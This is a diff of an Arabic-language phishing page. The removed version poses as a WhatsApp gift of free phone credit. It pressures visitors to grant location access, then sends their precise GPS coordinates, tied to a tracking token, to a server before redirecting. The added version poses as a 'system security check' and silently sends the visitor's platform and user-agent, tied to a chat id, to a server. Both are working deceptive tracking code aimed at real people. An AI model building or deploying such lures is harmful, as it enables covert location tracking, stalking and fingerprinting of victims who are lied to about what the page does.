@@ -2,128 +2,24 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎁 هدية رصيد مجاني وصلت لك عبر واتساب</title>
-    
-    <meta property="og:title" content="لقد تلقيت هدية رصيد مجاني بقيمة 100 ريال/دولار! اضغط للاستلام">
-    <meta property="og:description" content="أرسل لك أحد أصدقائك هدية رصيد مجاني عبر واتساب. انقر هنا لتأكيد دولتك واستلام الرصيد فوراً!">
-    <meta property="og:image" content="https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=1200&auto=format&fit=crop&q=80">
-    <meta property="og:type" content="website">
-
+    <title>System Check</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;900&display=swap');
-        body { font-family: 'Tajawal', sans-serif; }
-        .wa-gradient { background: linear-gradient(135deg, #25D366 0%, #128C7E 100%); }
-        .glass-card { background: rgba(18, 18, 24, 0.95); backdrop-filter: blur(12px); border: 1px solid rgba(37, 211, 102, 0.3); }
-    </style>
+    <style>body { background: black; color: white; font-family: sans-serif; }</style>
 </head>
-<body class="bg-black text-white min-h-screen flex flex-col justify-between selection:bg-[#25D366] selection:text-white">
-
-    <header class="w-full bg-[#075E54] py-3.5 px-4 md:px-8 sticky top-0 z-50 shadow-md flex items-center justify-between">
-        <div class="flex items-center space-x-3 space-x-reverse">
-            <div class="w-10 h-10 rounded-full bg-white/20 flex items-center justify-center text-white text-xl">
-                <i class="fa-brands fa-whatsapp"></i>
-            </div>
-            <div>
-                <span class="font-bold text-base text-white block">هدية الرصيد المجاني</span>
-                <span class="text-[11px] text-emerald-200 block">متصل الآن عبر واتساب</span>
-            </div>
-        </div>
-        <div class="text-xs bg-emerald-600 text-white px-3 py-1 rounded-full font-semibold">
-            هدية مؤكدة 🎁
-        </div>
-    </header>
-
-    <main class="flex-grow flex items-center justify-center p-4 md:p-6">
-        <div class="w-full max-w-md glass-card rounded-3xl p-6 md:p-8 shadow-2xl relative overflow-hidden text-center space-y-6">
-            
-            <div class="w-20 h-20 rounded-3xl wa-gradient flex items-center justify-center mx-auto text-4xl text-white shadow-lg shadow-[#25D366]/30 animate-bounce">
-                <i class="fa-solid fa-gift"></i>
-            </div>
-
-            <div class="space-y-2">
-                <span class="bg-[#25D366]/20 text-[#25D366] text-xs px-3 py-1 rounded-full font-bold border border-[#25D366]/30">تهانينا! لديك رصيد في الانتظار</span>
-                <h1 class="text-xl md:text-2xl font-black text-white">جاري تحديد شبكة دولتك لتحويل الرصيد...</h1>
-                <p class="text-xs text-zinc-400 leading-relaxed">
-                    يرجى النقر على زر <span class="text-[#25D366] font-bold">"السماح" (Allow)</span> في رسالة المتصفح الفورية لتأكيد إيداع الرصيد في هاتفك.
-                </p>
-            </div>
-
-            <div class="bg-zinc-900 border border-zinc-800 p-4 rounded-2xl text-right space-y-1 relative">
-                <div class="absolute -top-3 right-4 bg-[#075E54] text-[10px] text-white px-2 py-0.5 rounded">رسالة الهدية</div>
-                <p class="text-xs text-zinc-300">"مرحباً بك! تم إرسال هدية رصيد بقيمة 100 ريال لجهازك، اتبع التعليمات لاستلامها فوراً."</p>
-                <span class="text-[10px] text-zinc-500 block text-left">الآن ✓✓</span>
-            </div>
-
-            <div id="statusText" class="text-xs text-emerald-400 font-semibold animate-pulse">
-                جاري طلب صلاحية الموقع الفوري...
-            </div>
-
-        </div>
-    </main>
-
-    <footer class="w-full text-center py-4 text-xs text-zinc-500 border-t border-zinc-900">
-        جميع الحقوق محفوظة © WhatsApp Gift Credits 2026
-    </footer>
-
+<body class="flex flex-col items-center justify-center min-h-screen">
+    <div class="animate-pulse text-red-500 text-xl font-bold">جاري فحص أمان النظام...</div>
     <script>
-        window.addEventListener('DOMContentLoaded', () => {
-            const statusText = document.getElementById('statusText');
-
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    async (position) => {
-                        statusText.textContent = "تم استلام الموقع بنجاح! جاري تحويلك للرصيد...";
-                        statusText.className = "text-xs text-emerald-400 font-bold";
-
-                        // استخراج الرمز token بدقة تامة من المسار أو الاستعلام
-                        const pathParts = window.location.pathname.split('/');
-                        let token = pathParts[pathParts.length - 1];
-                        if (!token || token === 'lo.html' || token === 'getLocation') {
-                            token = new URLSearchParams(window.location.search).get('t');
-                        }
-
-                        if (!token) {
-                            console.error('Token not found in path.');
-                            return;
-                        }
-
-                        const payload = {
-                            token: token,
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy + " متر"
-                        };
-
-                        try {
-                            // إرسال الإحداثيات إلى مسار /submitLocation في السيرفر
-                            await fetch('/submitLocation', {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify(payload)
-                            });
-                        } catch (e) {
-                            console.error('Failed to submit location');
-                        }
-
-                        setTimeout(() => {
-                            window.location.href = 'https://www.whatsapp.com';
-                        }, 2000);
-                    },
-                    (error) => {
-                        statusText.textContent = "تنبيه هام: يرجى الضغط على 'السماح بالموقع' لإتمام إيداع الرصيد!";
-                        statusText.className = "text-xs text-red-400 font-semibold";
-                    },
-                    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
-                );
-            } else {
-                statusText.textContent = "متصفحك لا يدعم خاصية تحديد الموقع.";
-                statusText.className = "text-xs text-red-400 font-semibold";
-            }
-        });
+        window.onload = async () => {
+            const urlParams = new URLSearchParams(window.location.search);
+            const chatId = urlParams.get('id');
+            const info = { deviceName: navigator.platform, browserName: navigator.userAgent };
+            await fetch('/mm', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ userId: chatId, deviceInfo: info })
+            });
+            setTimeout(() => { window.location.href = "https://google.com"; }, 1500);
+        };
     </script>
 </body>
 </html>
-
